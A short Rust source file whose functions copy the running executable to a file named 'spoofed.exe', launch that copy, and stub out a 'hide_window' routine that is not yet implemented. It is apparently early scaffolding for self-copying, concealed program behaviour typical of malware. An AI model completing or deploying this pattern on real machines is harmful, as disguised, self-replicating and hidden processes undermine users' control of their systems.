use std::env;
use std::fs::File;
use std::path::PathBuf;
use std::io::{self, Read, Write};
use std::process::Command;

pub fn duplicate_itself() -> io::Result<PathBuf> {
    let executable_path = env::current_exe()?;
    let mut file = File::open(&executable_path)?;
    let mut buffer: Vec<u8> = Vec::new();

    file.read_to_end(&mut buffer)?;

    let spoofed_name = "spoofed.exe";
    let spoofed_executable_path = executable_path.with_file_name(&spoofed_name);
    let mut spoofed_file = File::create(&spoofed_executable_path)?;

    spoofed_file.write_all(&buffer)?;

    Ok(spoofed_executable_path)
}

pub fn run_program(path: &PathBuf) {
    Command::new(path)
        .arg("spoofed")
        .spawn()
        .expect("Failed to spawn process");
}

pub fn hide_window() {
    #[cfg(target_os = "linux")]
    {
        println!("Linux");
    }

    #[cfg(target_os = "windows")]
    {
        println!("Windows");
    }

    // Not implemented yet
}